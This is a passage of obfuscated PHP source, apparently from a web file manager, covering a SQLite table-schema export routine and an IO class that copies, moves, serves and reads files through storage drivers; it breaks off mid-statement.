$ê¤ÓÄÙı =& $_SERVER[ü¢ÙÊñÛ]; $ËÜêóËõ = $this->model()->db(); $ö½ãÍ€ = "\120\122\101\107\115\x41\x20\124\x41\x42\x4c\x45\137\x49\x4e\x46\x4f\40\50\x27{$«íåÑ¢È}\x27\51"; $Ş˜¾¹ªĞ = "\x53\x45\x4c\x45\103\124\x20\x2a\x20\x46\x52\x4f\x4d\40\x73\161\154\151\x74\x65\137\155\x61\x73\x74\145\162\x20\127\110\x45\x52\105\x20\164\x62\154\137\x6e\141\x6d\x65\40\x3d\40\x27{$«íåÑ¢È}\x27"; $¬Ù¶÷¾Ë = $ËÜêóËõ->query($ö½ãÍ€); if (empty($¬Ù¶÷¾Ë)) { $¤¦ˆÙÑ = array($ê¤ÓÄÙı[870] => $ê¤ÓÄÙı[22], $ê¤ÓÄÙı[23] => $ê¤ÓÄÙı[22]); return $‰Ş’şïì ? $¤¦ˆÙÑ[$‰Ş’şïì] : $¤¦ˆÙÑ; } $–×ášŠ = $ËÜêóËõ->query($Ş˜¾¹ªĞ); $”ĞÇ£û‰ = $Æ–äÂ¤¼ = array(); foreach ($–×ášŠ as $˜ÃìÏî£) { if ($˜ÃìÏî£[$ê¤ÓÄÙı[43]] == $ê¤ÓÄÙı[368]) { $”ĞÇ£û‰[] = $˜ÃìÏî£[$ê¤ÓÄÙı[1198]]; } else { $Æ–äÂ¤¼[$˜ÃìÏî£[$ê¤ÓÄÙı[42]]] = $˜ÃìÏî£[$ê¤ÓÄÙı[1198]]; } } $»­Ì½Ë = array_merge(array($ê¤ÓÄÙı[1194] . $«íåÑ¢È . $ê¤ÓÄÙı[132]), $”ĞÇ£û‰, array_values($Æ–äÂ¤¼)); $»­Ì½Ë = implode($ê¤ÓÄÙı[85] . PHP_EOL, $»­Ì½Ë) . $ê¤ÓÄÙı[85]; if ($‰Ş’şïì && $‰Ş’şïì == $ê¤ÓÄÙı[23]) { return $»­Ì½Ë; } $Ö’¾÷íõ = array(); foreach ($Æ–äÂ¤¼ as $Íüï¸ºş => $¹–€ÚÄ) { $òí å¬ = str_replace($ê¤ÓÄÙı[1199] . $«íåÑ¢È . $ê¤ÓÄÙı[21], $ê¤ÓÄÙı[22], $Íüï¸ºş); $òí å¬ = str_replace($«íåÑ¢È . $ê¤ÓÄÙı[21], $ê¤ÓÄÙı[22], $Íüï¸ºş); $Ææø¿ÖÊ = str_replace(array($ê¤ÓÄÙı[132], $ê¤ÓÄÙı[1023]), $ê¤ÓÄÙı[472], substr($¹–€ÚÄ, stripos($¹–€ÚÄ, $ê¤ÓÄÙı[349]))); $Ö’¾÷íõ[$òí å¬] = $Ææø¿ÖÊ; } $ü™ÌÆ = array(); $¿ş¡¥Óì = array($ê¤ÓÄÙı[1186] => $ê¤ÓÄÙı[1200], $ê¤ÓÄÙı[402] => $ê¤ÓÄÙı[1201]); $“…”éö· = $¿î•Ëö¢ = $ê¤ÓÄÙı[22]; foreach ($¬Ù¶÷¾Ë as $˜ÃìÏî£) { if ($˜ÃìÏî£[$ê¤ÓÄÙı[68]] == $ê¤ÓÄÙı[102]) { $“…”éö· = $˜ÃìÏî£[$ê¤ÓÄÙı[42]]; } $—”ï¬¬  = $˜ÃìÏî£[$ê¤ÓÄÙı[43]]; if ($—”ï¬¬  == $ê¤ÓÄÙı[1202] && isset($Ö’¾÷íõ[$˜ÃìÏî£[$ê¤ÓÄÙı[42]]])) { $—”ï¬¬  = $ê¤ÓÄÙı[1203]; } $İàÌ¬˜’ = array($ê¤ÓÄÙı[472] . $˜ÃìÏî£[$ê¤ÓÄÙı[42]] . $ê¤ÓÄÙı[472], _get($¿ş¡¥Óì, $—”ï¬¬ , $—”ï¬¬ ), $˜ÃìÏî£[$ê¤ÓÄÙı[45]] == $ê¤ÓÄÙı[102] ? $ê¤ÓÄÙı[1191] : $ê¤ÓÄÙı[1204] . $˜ÃìÏî£[$ê¤ÓÄÙı[67]], $˜ÃìÏî£[$ê¤ÓÄÙı[68]] == $ê¤ÓÄÙı[102] ? $ê¤ÓÄÙı[1205] : $ê¤ÓÄÙı[22]); $ü™ÌÆ[] = trim(implode($ê¤ÓÄÙı[63], $İàÌ¬˜’)); } foreach ($Ö’¾÷íõ as $òí å¬ => $Ææø¿ÖÊ) { if ($òí å¬ == $ê¤ÓÄÙı[1180]) { $ôìŠ”Å‹ = $¿î•Ëö¢ = $ê¤ÓÄÙı[1206] . $“…”éö· . $ê¤ÓÄÙı[1207]; } else { $ôìŠ”Å‹ = (stripos($òí å¬, $ê¤ÓÄÙı[21]) ? $ê¤ÓÄÙı[1208] : $ê¤ÓÄÙı[22]) . ($ê¤ÓÄÙı[1209] . $òí å¬ . $ê¤ÓÄÙı[1210] . $Ææø¿ÖÊ); } $ü™ÌÆ[] = $ôìŠ”Å‹; } if ($“…”éö· && !$¿î•Ëö¢) { $ü™ÌÆ = array_merge(array($ê¤ÓÄÙı[1206] . $“…”éö· . $ê¤ÓÄÙı[1207]), $ü™ÌÆ); } $Ç’øÂö = array($ê¤ÓÄÙı[1211] . $«íåÑ¢È . $ê¤ÓÄÙı[1212], $ê¤ÓÄÙı[1213] . $«íåÑ¢È . $ê¤ÓÄÙı[1214], implode($ê¤ÓÄÙı[60] . PHP_EOL, $ü™ÌÆ), $ê¤ÓÄÙı[1215]); $È§Æ»™¾ = implode(PHP_EOL, $Ç’øÂö); if ($‰Ş’şïì && $‰Ş’şïì == $ê¤ÓÄÙı[870]) { return $È§Æ»™¾; } $¤¦ˆÙÑ = array($ê¤ÓÄÙı[870] => $È§Æ»™¾, $ê¤ÓÄÙı[23] => $»­Ì½Ë); return $‰Ş’şïì ? $¤¦ˆÙÑ[$‰Ş’şïì] : $¤¦ˆÙÑ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ƒÌ°¡é¬, $’ ÈÆ¸§) { $‡ïï¨“ =& $_SERVER[ü¢ÙÊñÛ]; $Õßğ¬Ùá = $’ ÈÆ¸§; $GLOBALS[$‡ïï¨“[1216]] = $‡ïï¨“[1217] . $ƒÌ°¡é¬; Hook::trigger($‡ïï¨“[1217] . $ƒÌ°¡é¬ . $‡ïï¨“[1218], $Õßğ¬Ùá); $êèŒáœ = self::driverMake($’ ÈÆ¸§[0]); if (!$êèŒáœ) { return !1; } if (method_exists($êèŒáœ, $ƒÌ°¡é¬)) { $à¶„ˆù = @call_user_func_array(array($êèŒáœ, $ƒÌ°¡é¬), $’ ÈÆ¸§); } else { if (method_exists($êèŒáœ, $‡ïï¨“[1219])) { $à¶„ˆù = @call_user_func_array(array($êèŒáœ, $ƒÌ°¡é¬), $’ ÈÆ¸§); } else { if (method_exists(self, $ƒÌ°¡é¬)) { $à¶„ˆù = @call_user_func_array(array(self, $ƒÌ°¡é¬), $’ ÈÆ¸§); } else { $à¶„ˆù = call_user_func_array(array(parent, $ƒÌ°¡é¬), $’ ÈÆ¸§); } } } Hook::trigger($‡ïï¨“[1217] . $ƒÌ°¡é¬ . $‡ïï¨“[1220], $Õßğ¬Ùá, $à¶„ˆù); return $à¶„ˆù; } public static function init($àôÍ†éœ) { return self::driverMake($àôÍ†éœ); } public static function copy($ù£È’¡, $æù©‚¥¼, $İ¤ƒõ‰ = false, $€ğ‚¼ø– = false) { return self::copyMoveStart($ù£È’¡, $æù©‚¥¼, $İ¤ƒõ‰, $_SERVER[ü¢ÙÊñÛ][632], $€ğ‚¼ø–); } public static function move($ŠëÑñĞ’, $³ƒû——¦, $ÅöŒÛ‚· = false, $±Ôöª‘½ = false) { return self::copyMoveStart($ŠëÑñĞ’, $³ƒû——¦, $ÅöŒÛ‚·, $_SERVER[ü¢ÙÊñÛ][634], $±Ôöª‘½); } public static function copyMoveChildren($©ğ“½„Ç, $¤Ò—½²³, $Á»ü×» = "\143\x6f\160\x79", $ûå¿©‰Î = REPEAT_REPLACE) { $”ş•ş¯Ê =& $_SERVER[ü¢ÙÊñÛ]; $Ğşã¿Å = $©ğ“½„Ç; $¾âÍùù“ = self::driverMake($©ğ“½„Ç); $êçÁãÅÆ = $¾âÍùù“->listPath($©ğ“½„Ç, !0); $ãŒ–åëì = array_merge($êçÁãÅÆ[$”ş•ş¯Ê[97]], $êçÁãÅÆ[$”ş•ş¯Ê[96]]); foreach ($ãŒ–åëì as $¦Üè²Ö°) { self::copyMoveStart($¦Üè²Ö°[$”ş•ş¯Ê[98]], $¤Ò—½²³, $ûå¿©‰Î, $Á»ü×», !1); } if ($Á»ü×» == $”ş•ş¯Ê[634]) { self::remove($Ğşã¿Å); } } private static function copyMoveStart($Šèëı»˜, $Ğ–Ñëñ–, $âˆ„ìÀƒ, $Ÿş´ Øğ, $ÈÊ´íÚà) { $…½ºåş =& $_SERVER[ü¢ÙÊñÛ]; $ì÷šË•ˆ = array($Šèëı»˜, $Ğ–Ñëñ–, $âˆ„ìÀƒ, $ÈÊ´íÚà); Hook::trigger($…½ºåş[1217] . $Ÿş´ Øğ . $…½ºåş[1218], $ì÷šË•ˆ); $êéÒ§Ì = self::copyMove($Šèëı»˜, $Ğ–Ñëñ–, $âˆ„ìÀƒ, $Ÿş´ Øğ, $ÈÊ´íÚà); Hook::trigger($…½ºåş[1217] . $Ÿş´ Øğ . $…½ºåş[1220], $ì÷šË•ˆ, $êéÒ§Ì); return $êéÒ§Ì; } public static function saveFile($á¹ıïÇü, $äàÂ€Ûà, $šèö©úÕ = true) { $ª¾·áÔ¸ =& $_SERVER[ü¢ÙÊñÛ]; $íàÆä‹ = self::info($äàÂ€Ûà); $ÎÔ®²ˆŒ = self::driverMake($á¹ıïÇü); $™…§ = self::driverMake($äàÂ€Ûà); $²à”ôó = !1; if ($™…§->pathParse[$ª¾·áÔ¸[1221]]) { $²à”ôó = $™…§; $¤ºğÙ©õ = $™…§->pathParse[$ª¾·áÔ¸[1221]]; $™…§ = self::driverMake($¤ºğÙ©õ); } if ($ÎÔ®²ˆŒ->pathParse[$ª¾·áÔ¸[1221]]) { $Ü›Ğ—» = $ÎÔ®²ˆŒ->pathParse[$ª¾·áÔ¸[1221]]; $ÎÔ®²ˆŒ = self::driverMake($Ü›Ğ—»); } $’âÊ ë = $™…§->pathFather($äàÂ€Ûà); $¾¾Õ³Ó = !0; if (!$šèö©úÕ && self::driverIsSame($ÎÔ®²ˆŒ, $™…§)) { $¾¾Õ³Ó = !1; } $ã¨¨ÄÁï = self::copyFile($ÎÔ®²ˆŒ, $á¹ıïÇü, $™…§, $’âÊ ë, $íàÆä‹[$ª¾·áÔ¸[42]], $¾¾Õ³Ó); if ($²à”ôó) { $ã¨¨ÄÁï = $²à”ôó->getPathOuter($ã¨¨ÄÁï); } return $ã¨¨ÄÁï; } private static function copyMove($ƒóû©ó, $² ìšèÀ, $¿¼éÎ„É, $ô§¤Ş†ù, $ÇŸìÁÖË = false) { $ó‰°Šùã =& $_SERVER[ü¢ÙÊñÛ]; if (!$ƒóû©ó || $ƒóû©ó == $ó‰°Šùã[18] || !$² ìšèÀ) { return !1; } ignore_timeout(); $¬¤º„ÖÁ = self::driverMake($ƒóû©ó); $í¦ª„Ï¼ = self::driverMake($² ìšèÀ); $†¼šû­¯ = $ô§¤Ş†ù == $ó‰°Šùã[634]; $•»¯Š·è = !1; if ($í¦ª„Ï¼->pathParse[$ó‰°Šùã[1221]]) { $•»¯Š·è = $í¦ª„Ï¼; $² ìšèÀ = $í¦ª„Ï¼->pathParse[$ó‰°Šùã[1221]]; $í¦ª„Ï¼ = self::driverMake($² ìšèÀ); } if ($¬¤º„ÖÁ->pathParse[$ó‰°Šùã[1221]]) { $ƒóû©ó = $¬¤º„ÖÁ->pathParse[$ó‰°Šùã[1221]]; $¬¤º„ÖÁ = self::driverMake($ƒóû©ó); } self::check($¬¤º„ÖÁ, $ƒóû©ó, $í¦ª„Ï¼, $² ìšèÀ); Hook::trigger($ó‰°Šùã[1222], $¬¤º„ÖÁ, $ƒóû©ó, $í¦ª„Ï¼, $² ìšèÀ); $×£øÅ = self::driverIsSame($¬¤º„ÖÁ, $í¦ª„Ï¼); if ($×£øÅ) { if ($ô§¤Ş†ù == $ó‰°Šùã[634] && !method_exists($í¦ª„Ï¼, $ó‰°Šùã[1223]) && trim($² ìšèÀ, $ó‰°Šùã[18]) == trim($í¦ª„Ï¼->pathFather($ƒóû©ó), $ó‰°Šùã[18])) { if ($¬¤º„ÖÁ->pathThis($ƒóû©ó) != $ÇŸìÁÖË && !$¬¤º„ÖÁ->isOsDriver()) { return $¬¤º„ÖÁ->rename($ƒóû©ó, $ÇŸìÁÖË); } return $í¦ª„Ï¼->getPathOuter($ƒóû©ó); } if (method_exists($í¦ª„Ï¼, $ô§¤Ş†ù)) { return $í¦ª„Ï¼->{$ô§¤Ş†ù}($ƒóû©ó, $² ìšèÀ, $¿¼éÎ„É, $ÇŸìÁÖË); } } if ($×£øÅ && $ô§¤Ş†ù == $ó‰°Šùã[634] && $í¦ª„Ï¼->getType() == $ó‰°Šùã[120]) { $ÁÊçìÄ­ = $í¦ª„Ï¼->movePath($ƒóû©ó, $² ìšèÀ, $ÇŸìÁÖË); if ($ÁÊçìÄ­) { return $ÁÊçìÄ­; } } $ûá›”ÉÀ = $¬¤º„ÖÁ->isFile($ƒóû©ó); if (!$ûá›”ÉÀ && $í¦ª„Ï¼->getType() == $ó‰°Šùã[822] && $¬¤º„ÖÁ->getType() == $ó‰°Šùã[120]) { $ÁÊçìÄ­ = $í¦ª„Ï¼->copyFolderFromIO($¬¤º„ÖÁ, $ƒóû©ó, $² ìšèÀ, $¿¼éÎ„É, $†¼šû­¯, $ÇŸìÁÖË); } else { $ÁÊçìÄ­ = self::copyPath($¬¤º„ÖÁ, $ƒóû©ó, $í¦ª„Ï¼, $² ìšèÀ, $¿¼éÎ„É, $†¼šû­¯, $ûá›”ÉÀ, $ÇŸìÁÖË); } if ($ÁÊçìÄ­ && $†¼šû­¯) { $¬¤º„ÖÁ->remove($ƒóû©ó); } if ($•»¯Š·è) { $ÁÊçìÄ­ = $•»¯Š·è->getPathOuter($ÁÊçìÄ­); } return $ÁÊçìÄ­; } private static function check($ıõµ‹è«, $ó¢¾ÉËè, $Å ñ•¨æ, &$¸£çå´Ã) { $¸‹µ‘¨ì =& $_SERVER[ü¢ÙÊñÛ]; if (self::driverIsSame($ıõµ‹è«, $Å ñ•¨æ) && $ıõµ‹è«->isFolder($ó¢¾ÉËè) && $ıõµ‹è«->isParentOf($ó¢¾ÉËè, $¸£çå´Ã)) { show_json(LNG($¸‹µ‘¨ì[1224]), !1); } if (!$ıõµ‹è«->exist($ó¢¾ÉËè)) { show_json(LNG($¸‹µ‘¨ì[119]), !1); } } private static function copyPath($Ğ¬÷à©, $ÃíÌ»›ê, $šî¬É, $ééöÌ‡¶, $ñ¹‘„Öâ, $Ê­‘çÊÌ, $ë‹ğÊ¸Î, $¾€åëşÜ = false, $ëåÇšœİ = true) { $ÆÃ¹Ùïı =& $_SERVER[ü¢ÙÊñÛ]; $Ä•²—­‰ = empty($¾€åëşÜ) && $¾€åëşÜ !== $ÆÃ¹Ùïı[241] ? $Ğ¬÷à©->pathThis($ÃíÌ»›ê) : $¾€åëşÜ; if ($ñ¹‘„Öâ) { $şöÍÊÎ˜ = $šî¬É->fileNameExist($ééöÌ‡¶, $Ä•²—­‰); $ìµ›şÎ = $Ä•²—­‰; $Ä•²—­‰ = $šî¬É->fileNameAuto($ééöÌ‡¶, $Ä•²—­‰, $ñ¹‘„Öâ, !$ë‹ğÊ¸Î); if (!$şöÍÊÎ˜ || $ìµ›şÎ != $Ä•²—­‰) { $ñ¹‘„Öâ = !1; } if ($ëåÇšœİ && !$ñ¹‘„Öâ) { $šî¬É->_data[$ÆÃ¹Ùïı[1225]] = !0; } } if ($ë‹ğÊ¸Î) { return self::copyFile($Ğ¬÷à©, $ÃíÌ»›ê, $šî¬É, $ééöÌ‡¶, $Ä•²—­‰, $Ê­‘çÊÌ); } if ($ñ¹‘„Öâ == REPEAT_RENAME_FOLDER) { $ñ¹‘„Öâ = !1; } $şÀôú›¤ = rtrim($ééöÌ‡¶, $ÆÃ¹Ùïı[18]) . $ÆÃ¹Ùïı[18] . $Ä•²—­‰; $äì´‘ = $šî¬É->mkdir($šî¬É->getPath($şÀôú›¤), $ñ¹‘„Öâ); $ééöÌ‡¶ = $šî¬É->getPathInner($äì´‘); $ƒí¶¼«¼ = $Ğ¬÷à©->listPath($ÃíÌ»›ê, !0); $ƒí¶¼«¼ = is_array($ƒí¶¼«¼) ? $ƒí¶¼«¼ : array($ÆÃ¹Ùïı[97] => array(), $ÆÃ¹Ùïı[96] => array()); $ıºƒáíÆ = array_merge($ƒí¶¼«¼[$ÆÃ¹Ùïı[97]], $ƒí¶¼«¼[$ÆÃ¹Ùïı[96]]); foreach ($ıºƒáíÆ as $Şù°À±) { $ºûüÅÁÆ = $Şù°À±[$ÆÃ¹Ùïı[43]] == $ÆÃ¹Ùïı[243]; $ÃíÌ»›ê = $Ğ¬÷à©->getPathInner($Şù°À±[$ÆÃ¹Ùïı[98]]); $¶Üù·ÜÒ = self::copyPath($Ğ¬÷à©, $ÃíÌ»›ê, $šî¬É, $ééöÌ‡¶, $ñ¹‘„Öâ, $Ê­‘çÊÌ, $ºûüÅÁÆ, !1, !1); if (!$¶Üù·ÜÒ) { IO::errorTips($ÆÃ¹Ùïı[1226] . $ÃíÌ»›ê . $ÆÃ¹Ùïı[84] . $ééöÌ‡¶); } } self::copyMoveKeepInfo($Ğ¬÷à©, $ÃíÌ»›ê, $äì´‘); return $äì´‘; } private static function copyFile($¬®ÇŸËÎ, $úÚì—º„, $Ï¢©ö, $×‹Ø³Ä˜, $Ø·õ®—â, $°µ‡½Àç) { $•ö¼Ú· =& $_SERVER[ü¢ÙÊñÛ]; $×‹Ø³Ä˜ = $Ï¢©ö->getPath(rtrim($×‹Ø³Ä˜, $•ö¼Ú·[18]) . $•ö¼Ú·[18] . $Ø·õ®—â); $’²û™‘¹ = $•ö¼Ú·[1227] . time() . rand_string(5); Hook::trigger($•ö¼Ú·[1228], $¬®ÇŸËÎ, $úÚì—º„, $Ï¢©ö, $×‹Ø³Ä˜, $Ø·õ®—â, $’²û™‘¹); if (self::driverIsSame($¬®ÇŸËÎ, $Ï¢©ö)) { if ($°µ‡½Àç) { $Öù·ŒŒï = $Ï¢©ö->moveFile($úÚì—º„, $×‹Ø³Ä˜); } else { $Öù·ŒŒï = $Ï¢©ö->copyFile($úÚì—º„, $×‹Ø³Ä˜); } Hook::trigger($•ö¼Ú·[1229], $¬®ÇŸËÎ, $úÚì—º„, $Ï¢©ö, $×‹Ø³Ä˜, $Ø·õ®—â, $Öù·ŒŒï); self::copyMoveKeepInfo($¬®ÇŸËÎ, $úÚì—º„, $Öù·ŒŒï); return $Öù·ŒŒï; } $äÃı¨­Ì = TEMP_FILES; if ($GLOBALS[$•ö¼Ú·[16]][$•ö¼Ú·[103]][$•ö¼Ú·[862]]) { $äÃı¨­Ì = $GLOBALS[$•ö¼Ú·[16]][$•ö¼Ú·[103]][$•ö¼Ú·[862]]; } $Œ¦Ø¶°à = $äÃı¨­Ì; mk_dir($Œ¦Ø¶°à); $ëËƒĞ…î = $Œ¦Ø¶°à . $’²û™‘¹; $ËóĞÒå = $ëËƒĞ…î; $ëËƒĞ…î = $¬®ÇŸËÎ->download($úÚì—º„, $ëËƒĞ…î); $ëËƒĞ…î = $¬®ÇŸËÎ->iconvApp($ëËƒĞ…î); if (substr($ëËƒĞ…î, strlen($äÃı¨­Ì)) == $äÃı¨­Ì) { $°µ‡½Àç = !0; } $Öù·ŒŒï = $Ï¢©ö->upload($×‹Ø³Ä˜, $ëËƒĞ…î, $°µ‡½Àç); self::remove($ËóĞÒå); Hook::trigger($•ö¼Ú·[1229], $¬®ÇŸËÎ, $úÚì—º„, $Ï¢©ö, $×‹Ø³Ä˜, $Ø·õ®—â, $Öù·ŒŒï); self::copyMoveKeepInfo($¬®ÇŸËÎ, $úÚì—º„, $Öù·ŒŒï); return $Öù·ŒŒï; } private static function copyMoveKeepInfo($‡µ¬¸Ñ, $­ÜĞÂùï, $šúÙ) { if (!$šúÙ) { return; } $Ö¼å¹× = $‡µ¬¸Ñ->info($­ÜĞÂùï); if (!is_array($Ö¼å¹×)) { return; } IO::setModifyTime($šúÙ, $Ö¼å¹×[$_SERVER[ü¢ÙÊñÛ][99]]); } public static function pathFather($–àì××) { $²’ ¢ñ¯ = IO::init($–àì××); $Ü¡µ¯‘™ = $²’ ¢ñ¯->pathFather($²’ ¢ñ¯->path); return $²’ ¢ñ¯->getPathOuter($Ü¡µ¯‘™); } public static function fileOut($¶®Ë„¤Õ, $˜†üûĞ˜ = false, $½¤¢´· = false, $¿´Â÷½ = '') { $ıï¯êÒ = self::driverMake($¶®Ë„¤Õ); if ($ıï¯êÒ->isFileOutServer()) { return $ıï¯êÒ->fileOutServer($¶®Ë„¤Õ, $˜†üûĞ˜, $½¤¢´·, $¿´Â÷½); } return $ıï¯êÒ->fileOut($¶®Ë„¤Õ, $˜†üûĞ˜, $½¤¢´·, $¿´Â÷½); } public static function fileOutImage($õ‘–‰Äç, $²ã€ıÕë = 250) { $ß¾ª˜ş = array(250, 600, 1200, 2000, 3000, 5000); for ($öùàıÈš = 0; $öùàıÈš < count($ß¾ª˜ş); $öùàıÈš++) { if ($öùàıÈš == 0 && $²ã€ıÕë <= $ß¾ª˜ş[$öùàıÈš]) { $²ã€ıÕë = $ß¾ª˜ş[$öùàıÈš]; break; } else { if ($²ã€ıÕë > $ß¾ª˜ş[$öùàıÈš - 1] && $²ã€ıÕë <= $ß¾ª˜ş[$öùàıÈš]) { $²ã€ıÕë = $ß¾ª˜ş[$öùàıÈš]; break; } else { if ($öùàıÈš == count($ß¾ª˜ş) - 1 && $²ã€ıÕë > $ß¾ª˜ş[$öùàıÈš]) { $²ã€ıÕë = $ß¾ª˜ş[$öùàıÈš]; break; } } } } $ĞŒûÚİ = self::driverMake($õ‘–‰Äç); if ($ĞŒûÚİ->isFileOutServer()) { return $ĞŒûÚİ->fileOutImageServer($õ‘–‰Äç, $²ã€ıÕë); } return $ĞŒûÚİ->fileOutImage($õ‘–‰Äç, $²ã€ıÕë); } private static function driverIsSame($‚Ô——¶…, $·ª°³äÎ) { $ßûùÕ‘ =& $_SERVER[ü¢ÙÊñÛ]; $×™åÊÏÁ = $‚Ô——¶…->getType(); $Ø£Í¢ò€ = $·ª°³äÎ->getType(); if ($×™åÊÏÁ != $Ø£Í¢ò€) { return !1; } if ($×™åÊÏÁ == $ßûùÕ‘[822]) { return !0; } if ($×™åÊÏÁ == $ßûùÕ‘[120]) { return !0; } if ($‚Ô——¶…->pathDriver == $·ª°³äÎ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ãÃ„Åçì, $µ¥ªÍß) { $²ÌÚŠèğ =& $_SERVER[ü¢ÙÊñÛ]; if (!IO::exist($ãÃ„Åçì)) { return !1; } if (!IO::exist($µ¥ªÍß)) { IO::mkdir($µ¥ªÍß); } $œ®¶ø³â = array_to_keyvalue(self::listAllSimple($ãÃ„Åçì), $²ÌÚŠèğ[98]); $æø’®™ú = array_to_keyvalue(self::listAllSimple($µ¥ªÍß), $²ÌÚŠèğ[98]); $€ƒ§àìä = array(); $É±€™¨‹ = array(); foreach ($œ®¶ø³â as $ÂË±¤¥Ë => $”ìŠªÏ•) { if (isset($æø’®™ú[$ÂË±¤¥Ë])) { if ($”ìŠªÏ•[$²ÌÚŠèğ[89]] == 1) { continue; } if ($æø’®™ú[$ÂË±¤¥Ë][$²ÌÚŠèğ[90]] == $”ìŠªÏ•[$²ÌÚŠèğ[90]]) { continue; } } if ($”ìŠªÏ•[$²ÌÚŠèğ[89]] == 1) { $É±€™¨‹[] = $µ¥ªÍß . $²ÌÚŠèğ[18] . trim($ÂË±¤¥Ë, $²ÌÚŠèğ[18]); continue; } $éŞâÑË‡ = strstr(trim($ÂË±¤¥Ë, $²ÌÚŠèğ[18]), $²ÌÚŠèğ[18]) ? get_path_father($ÂË±¤¥Ë) : $²ÌÚŠèğ[22]; $€ƒ§àìä[] = array($²ÌÚŠèğ[1230] => $”ìŠªÏ•[$²ÌÚŠèğ[100]], $²ÌÚŠèğ[1231] => rtrim($µ¥ªÍß, $²ÌÚŠèğ[18]) . $²ÌÚŠèğ[18] . $éŞâÑË‡, $²ÌÚŠèğ[1232] => $”ìŠªÏ•); } $Ÿ Ì²§“ = array($²ÌÚŠèğ[243] => $€ƒ§àìä, $²ÌÚŠèğ[89] => $É±€™¨‹); Hook::trigger($²ÌÚŠèğ[1233], $ãÃ„Åçì, $µ¥ªÍß, $Ÿ Ì²§“); foreach ($É±€™¨‹ as $”ìŠªÏ•) { IO::mkdir($”ìŠªÏ•); } foreach ($€ƒ§àìä as $”ìŠªÏ•) { IO::copy($”ìŠªÏ•[$²ÌÚŠèğ[1230]], $”ìŠªÏ•[$²ÌÚŠèğ[1231]], REPEAT_REPLACE); } } public static function fileSubstr($ëÍõèàç, $‹–ëóã, $ÁÍâŞ¼Î = false) { $€ïö´¸ˆ =& $_SERVER[ü¢ÙÊñÛ]; $øùè•´Ü = self::driverMake($ëÍõèàç); $±øğ¡• = $øùè•´Ü->size($ëÍõèàç); $µ²‰Éú‘ = $‹–ëóã; $¡şåÓ©Ÿ = $ÁÍâŞ¼Î; if ($‹–ëóã < 0) { $‹–ëóã = $±øğ¡• + $‹–ëóã; } if ($ÁÍâŞ¼Î === !1) { $ÁÍâŞ¼Î = $±øğ¡• - $‹–ëóã; } if ($‹–ëóã + $ÁÍâŞ¼Î > $±øğ¡•) { $ÁÍâŞ¼Î = $±øğ¡• - $‹–ëóã; } if (!$±øğ¡• && $øùè•´Ü->getType() == $€ïö´¸ˆ[120] && !$øùè•´Ü->exist($ëÍõèàç)) { $Ãİé¤À€ = get_path_this($ëÍõèàç); $šÉüû”³ = parse_url_query($Ãİé¤À€); if (is_array($šÉüû”³) && isset($šÉüû”³[$€ïö´¸ˆ[42]])) { $Ãİé¤À€ = urldecode($šÉüû”³[$€ïö´¸ˆ[42]]); } throw new Exception($€ïö´¸ˆ[1234] . LNG($€ïö´¸ˆ[1235]) . $€ïö´¸ˆ[1032] . clear_html($Ãİé¤À€) . $€ïö´¸ˆ[22]); } if ($ÁÍâŞ¼Î <= 0) { return $€ïö´¸ˆ[22]; } if ($‹–ëóã < 0 || $‹–ëóã >= $±øğ¡• || $ÁÍâŞ¼Î > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\122\145\x61\x64\x20\x65\x72\x72\157\x72\x21\x20\163\164\x61\x72\x74\75{$‹–ëóã}\x3b\x6c\x65\x6e\147\164\x68\x3d{$ÁÍâŞ¼Î}\x3b\40\163\151\172\145\75{$±øğ¡•}\x3b"); } $æº†æ¡€ = $øùè•´Ü->fileSubstr($ëÍõèàç, $‹–ëóã, $ÁÍâŞ¼Î); if (!$æº†æ¡€ && $ÁÍâŞ¼Î && isset($GLOBALS[$€ïö´¸ˆ[1236]])) { throw new Exception($GLOBALS[$€ïö´¸ˆ[1236]][$€ïö´¸ˆ[1237]]); } return $æº†æ¡€; } private static function driverMake(&$³ç†ãò„) { $õª´…İœ =& $_SERVER[ü¢ÙÊñÛ]; $¦¨Ö¿’ = KodIO::parse($³ç†ãò„); if (!self::$driverListSystem) { $‰Û··Êı = Model($õª´…İœ[832])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‰Û··Êı, $õª´…İœ[486]); } if ($¦¨Ö¿’[$õª´…İœ[43]] == KodIO::KOD_IO && !self::$driverListSystem[$¦¨Ö¿’[$õª´…İœ[486]]]) { throw new Exception($õª´…İœ[1238]); return !1; } $³ç†ãò„ = $¦¨Ö¿’[$õª´…İœ[1239]]; $ŸÑÓ»ÍÂ = self::driverGet($¦¨Ö¿’, $³ç†ãò„); return $ŸÑÓ»ÍÂ; } private static function driverGet($ãÙ¸Ãòù, &$¬à¹¿´) { $Ê»—û´¤ =& $_SERVER[ü¢ÙÊñÛ]; $¿©®ÍôÅ = $ãÙ¸Ãòù[$Ê»—û´¤[1240]]; $ó©Óíô¥ = $ãÙ¸Ãòù[$Ê»—û´¤[486]]; switch ($ãÙ¸Ãòù[$Ê»—û´¤[43]]) { case KodIO::KOD_IO: $ì‹İ¡ü = self::$driverListSystem[$ó©Óíô¥]; break; case KodIO::KOD_SOURCE: $¬à¹¿´ = $ó©Óíô¥ . $¬à¹¿´; $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1242], $Ê»—û´¤[16] => $ãÙ¸Ãòù); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‡¥¤Üë€ = $GLOBALS[$Ê»—û´¤[1243]]; self::$driverListUser = array_to_keyvalue($‡¥¤Üë€, $Ê»—û´¤[486]); } $ì‹İ¡ü = self::$driverListUser[$ó©Óíô¥]; break; case KodIO::KOD_SHARE_LINK: $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1244], $Ê»—û´¤[16] => $ãÙ¸Ãòù); $ûóÔòëÔ = Action($Ê»—û´¤[1245])->sharePathInfo($ãÙ¸Ãòù[$Ê»—û´¤[98]]); $¬à¹¿´ = $ûóÔòëÔ[$Ê»—û´¤[204]]; if (!$ûóÔòëÔ[$Ê»—û´¤[204]]) { $¥È¹ÅÁ· = Model($Ê»—û´¤[678])->getInfo($ûóÔòëÔ[$Ê»—û´¤[679]]); $¬à¹¿´ = KodIO::clear($¥È¹ÅÁ·[$Ê»—û´¤[1246]] . $ãÙ¸Ãòù[$Ê»—û´¤[1239]]); $ãÙ¸Ãòù[$Ê»—û´¤[571]] = $¥È¹ÅÁ·; 